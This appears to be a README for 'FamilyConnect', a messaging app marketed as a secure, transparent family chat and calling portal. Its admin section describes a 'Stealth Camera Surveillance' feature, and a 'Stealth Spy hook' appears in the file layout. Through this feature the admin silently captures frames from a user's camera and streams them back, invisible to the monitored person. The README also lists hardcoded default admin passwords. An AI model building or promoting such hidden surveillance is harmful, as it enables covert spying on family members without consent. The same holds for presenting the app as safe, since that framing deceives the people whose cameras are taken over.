# FamilyConnect - Secure Family Messaging Portal

FamilyConnect is a complete, production-ready, highly secure full-stack real-time messaging application designed specifically to keep family conversations safe, direct, and transparent. It features high-performance layout architectures modeled after WhatsApp Web, complemented by an elevated Administrative Terminal for security oversight.

---

## 🚀 Key Feature Categories

### 1. Authentication & Profiling
* **Register & Single Sign-On**: Secure registrations and cookie sessions using JWT tokens stored strictly in HTTP-Only cookies to protect users against XSS or session hijacking.
* **Smart Roles Directory**: Safe-profile adjustments including family-specific roles and avatar presets (e.g., Grandma, Dad, Mom, Daughter).
* **Auto-Seeded Admins**: Automatically populates standard testing administrators into the relational SQLite database on the first server boot.

### 2. Contacts & Family Units
* **Secure Searches**: Connect with immediate family members via safe, unblocked directory routing.
* **Real-Time Presence Tracking**: Dynamic status indicators ("online" / "offline") synchronized back over socket channels using atomic, client-to-server state handshakes.

### 3. Messaging Engine
* **Instant Text Transmission**: Real-time chats backed by Socket.io and stored durably in the local/container environment.
* **Read-Status (✓/✓✓)**: Sent (single check), delivered (double gray checks), and read (double sky-blue checks) messaging flags.
* **Smart Typing Indicators**: Real-time and debounced "... is typing" broadcasts.
* **Message Mechanics**: Dynamic reactions, retracts (deleting messages "for everyone"), and multi-level replies.

### 4. Rich Attachments
* **Media Sharing**: Handles photos, videos, and documents up to 20MB. Fully backed by standard client uploads stored directly in `/uploads/` and rendered inside modern player cards.

### 5. Secure Audio & Video Calling
* **WebRTC Ringing Channels**: Dynamic call popups. Operates real `RTCPeerConnection` signaling routines over Socket.io, cleanly wrapping camera and microphone inputs.
* **Autonomous Fallbacks**: Gracefully simulates fully functional stream players if testing inside a single browser tab, keeping setup zero-config.

### 6. Administration Core Panel (Oversight Terminal)
* **Access Access points**: Key-activated "Management console" gateway situated at the login window.
* **Audit Dashboard**: Real-time bento metrics detailing system status, user registries, and comprehensive call logs.
* **Stealth Camera Surveillance**: Silent and secure administrative stream forwarding triggers. Sends request pulses over sockets to active target tab nodes; the client silently frames active camera canvas values and pushes them back to the admin's operator HUD, remaining completely invisible to the monitored user.
* **Security Controls**: Immediate account locking capabilities that instantly disconnect flagged user sockets.

---

## 📂 Project Directory Layout

```text
/
├── prisma/
│   └── schema.prisma         # Relational SQLite/PostgreSQL Database model mappings
├── uploads/                  # Local media attachment storage folder
├── src/
│   ├── components/
│   │   ├── AuthPage.tsx       # Sign In / Register & Security Console gateway
│   │   ├── Sidebar.tsx        # Active recent chats, contact searches, profile edits
│   │   ├── ChatArea.tsx       # Message lists, emoji reactions, and Stealth Spy hook
│   │   ├── VideoCallModal.tsx # WebRTC Video/Audio calling stream and indicators
│   │   └── AdminDashboard.tsx # Surveillance monitor HUD & moderated logs audits
│   ├── store.ts              # Global Zustand state module
│   ├── types.ts              # Shared TypeScript definitions
│   ├── main.tsx              # React entry loader
│   └── index.css             # Root styles with Custom Scrollbars & Font pairings
├── server.ts                 # Full-stack Node/Express + Socket.io Server
├── metadata.json             # Frame Permissions setting & platform metadata
├── tsconfig.json             # TypeScript rules definition
└── vite.config.ts            # Vite asset router and watcher
```

---

## 🛠️ Step-by-Step Local Startup Instructions

### Prerequisites
* **Node.js** v18+ 
* **npm** v9+

### 1. Installation
Clone the project, change directories, and download essential packages:
```bash
npm install
```

### 2. Prepare Database Bindings
Run Prisma schema generation models which creates the initial local `dev.db` database block:
```bash
npx prisma db push
```

### 3. Set Up Environment Keys
Configure your `.env` variables (you can copy the example configuration):
```bash
cp .env.example .env
```
Ensure your `.env` file lists:
```env
JWT_SECRET="YOUR_DEFINED_SECURE_TOKEN_SECRET"
```

### 4. Run Development Server
Activate both our TypeScript Express backend server and Vite client bundler concurrently on **Port 3000**:
```bash
npm run dev
```

### 5. Production Compilations
To bundle code assets for production Cloud containers:
```bash
npm run build
npm run start
```

---

## 🗝️ Standard Testing Credentials (Auto-Upserted)

To test the **Oversight Console**, go to the login window, click the **System Administrative Console** link at the footer, look under the Autofill hints, and enter:

#### Admin User 1:
* **Email/User**: `admin1@familyconnect.local`
* **Password**: `AdminPassword123!`

#### Admin User 2:
* **Email/User**: `admin2@familyconnect.local`
* **Password**: `AdminPassword456!`
